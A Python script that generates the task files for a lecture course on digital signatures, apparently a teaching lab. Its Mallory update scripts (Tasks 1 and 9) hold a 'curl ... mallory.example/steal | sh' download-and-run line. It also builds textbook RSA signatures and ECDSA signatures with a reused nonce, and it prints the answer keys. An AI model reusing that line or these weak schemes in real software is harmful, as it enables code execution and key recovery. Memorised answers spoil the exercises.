"""Makes the data files of the Lecture 8 tasks and copies the ready modules into the task folders.

    cd Lecture08-Digital-Signatures && python3 checks/make_files.py

The keys are fixed: Ed25519 and ECDSA keys come from fixed labels, the RSA key is made once and then kept in
checks/alice_rsa_private.pem. So a second run gives the same files. If you delete that PEM file, the RSA numbers
change, and the README files, the slides and the lecturer's guide must be updated (Tasks 4, 5, 6, 7).
At the end the script prints the constants that the starter files contain (Task 1, 8, 9).
"""
import hashlib
import hmac
import os
import shutil

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec, rsa
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

HERE = os.path.dirname(os.path.abspath(__file__))
TOP = os.path.dirname(HERE)


def path(*parts):
    return os.path.join(TOP, *parts)


def write(rel, data):
    if isinstance(data, str):
        data = data.encode()
    with open(path(rel), "wb") as f:
        f.write(data)


def pem_private(key):
    return key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
                             serialization.NoEncryption())


def pem_public(key):
    return key.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)


def label(text):
    return hashlib.sha256(text.encode()).digest()


def copy(module, task):
    shutil.copy(os.path.join(HERE, module), path(task, module))


# ---------- keys ----------
alice_ed = Ed25519PrivateKey.from_private_bytes(label("lecture 8: Alice's Ed25519 key"))
mallory_ed = Ed25519PrivateKey.from_private_bytes(label("lecture 8: Mallory's Ed25519 key"))
P256_N = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551
alice_ec = ec.derive_private_key(int.from_bytes(label("lecture 8: Alice's ECDSA key"), "big") % P256_N,
                                 ec.SECP256R1())
rsa_path = os.path.join(HERE, "alice_rsa_private.pem")
if not os.path.exists(rsa_path):
    with open(rsa_path, "wb") as f:
        f.write(pem_private(rsa.generate_private_key(public_exponent=65537, key_size=2048)))
with open(rsa_path, "rb") as f:
    alice_rsa = serialization.load_pem_private_key(f.read(), password=None)
nums = alice_rsa.private_numbers()
N, E, D = nums.public_numbers.n, nums.public_numbers.e, nums.d

# ---------- Task 1: a download, a hash and a tag ----------
alice_update = ("#!/bin/sh\n# Notes app, update 2.1, from Alice\n"
                "cp notes-2.1 /usr/local/bin/notes\necho \"Notes updated to 2.1\"\n")
mallory_update = ("#!/bin/sh\n# Notes app, update 2.1, from Alice\n"
                  "cp notes-2.1 /usr/local/bin/notes\ncurl -s http://mallory.example/steal | sh\n"
                  "echo \"Notes updated to 2.1\"\n")
write("Task1/alice_update.sh", alice_update)
write("Task1/mallory_update.sh", mallory_update)
shared_key = label("lecture 8: the MAC key of Alice and Bob")
t1_page_hash = hashlib.sha256(mallory_update.encode()).hexdigest()
t1_alice_tag = hmac.new(shared_key, alice_update.encode(), "sha256").hexdigest()

# ---------- Task 2: Ed25519 keys ----------
write("Task2/alice_private.pem", pem_private(alice_ed))
write("Task2/alice_public.pem", pem_public(alice_ed.public_key()))
write("Task2/mallory_private.pem", pem_private(mallory_ed))
copy("signing.py", "Task2")

# ---------- Task 4 and Task 6: Alice's RSA key ----------
for t in ("Task4", "Task6"):
    write(t + "/alice_rsa_private.pem", pem_private(alice_rsa))
    copy("alice_key.py", t)

# ---------- Task 5: Alice's public key and two orders signed with textbook RSA ----------
write("Task5/alice_rsa_public.pem", pem_public(alice_rsa.public_key()))
orders = ""
for amount in (20, 50):
    orders += str(amount) + " " + format(pow(amount, D, N), "x") + "\n"
write("Task5/orders.txt", orders)
copy("bank_ready.py", "Task5")

# ---------- Task 6: a 100 000-byte update file ----------
block = bytearray()
counter = 0
while len(block) < 100000:
    block += hashlib.sha256(b"lecture 8: update.bin " + str(counter).encode()).digest()
    counter += 1
write("Task6/update.bin", bytes(block[:100000]))
signed = ""
for text in ("Pay Mallory 20 pounds. Alice", "Pay Mallory 50 pounds. Alice"):
    h = int.from_bytes(hashlib.sha256(text.encode()).digest(), "big")
    signed += format(pow(h, D, N), "x") + "\n"
write("Task6/signed_orders.txt", signed)

# ---------- Task 7: three keys of Alice ----------
write("Task7/alice_rsa_private.pem", pem_private(alice_rsa))
write("Task7/alice_ecdsa_private.pem", pem_private(alice_ec))
write("Task7/alice_ed25519_private.pem", pem_private(alice_ed))
copy("schemes.py", "Task7")

# ---------- Task 8: two console programs signed with the same k ----------
import sys
sys.path.insert(0, path("Task8"))
import ecdsa_ready as E8
console_d = int.from_bytes(label("lecture 8: Alice's console signing key"), "big") % E8.q
console_k = int.from_bytes(label("lecture 8: the k that never changes"), "big") % E8.q
game_1 = "GAME 1\nTitle: Space Racer\nVersion: 1.0\nPublisher: Alice Games\n"
game_2 = "GAME 2\nTitle: Garden Builder\nVersion: 2.3\nPublisher: Alice Games\n"
mallory_game = "GAME 3\nTitle: Mallory's Loader\nVersion: 0.1\nRuns any program on the console.\n"
write("Task8/game_1.txt", game_1)
write("Task8/game_2.txt", game_2)
write("Task8/mallory_game.txt", mallory_game)
r1, s1 = E8.sign_with_k(console_d, game_1.encode(), console_k)
r2, s2 = E8.sign_with_k(console_d, game_2.encode(), console_k)
Q = E8.public_key(console_d)
assert E8.verify(Q, game_1.encode(), r1, s1) and E8.verify(Q, game_2.encode(), r2, s2)

# ---------- Task 9: two update servers ----------
for d in ("Task9/alice_server", "Task9/mallory_server"):
    os.makedirs(path(d), exist_ok=True)
t9_alice = "#!/bin/sh\n# Notes app, update 3.0, from Alice\ncp notes-3.0 /usr/local/bin/notes\n"
t9_mallory = ("#!/bin/sh\n# Notes app, update 3.0, from Alice\ncp notes-3.0 /usr/local/bin/notes\n"
              "curl -s http://mallory.example/steal | sh\n")
write("Task9/alice_server/update.sh", t9_alice)
write("Task9/alice_server/update.sig", alice_ed.sign(t9_alice.encode()))
write("Task9/alice_server/public_key.pem", pem_public(alice_ed.public_key()))
write("Task9/mallory_server/update.sh", t9_mallory)
write("Task9/mallory_server/update.sig", mallory_ed.sign(t9_mallory.encode()))
write("Task9/mallory_server/public_key.pem", pem_public(mallory_ed.public_key()))
copy("signing.py", "Task9")
alice_ed_hex = alice_ed.public_key().public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw).hex()

print("Task 1: PAGE_HASH =", t1_page_hash)
print("Task 1: SHARED_KEY =", shared_key.hex())
print("Task 1: ALICE_TAG =", t1_alice_tag)
print("Task 8: Q =", hex(Q[0]), hex(Q[1]))
print("Task 8: r1 == r2:", r1 == r2, " r =", hex(r1))
print("Task 8: s1 =", hex(s1))
print("Task 8: s2 =", hex(s2))
print("Task 8: d (the answer) =", hex(console_d))
print("Task 8: k (the answer) =", hex(console_k))
print("Task 9: ALICE_KEY_HEX =", alice_ed_hex)
print("RSA: n =", format(N, "x")[:12], "...", format(N, "x")[-12:], " e =", E)
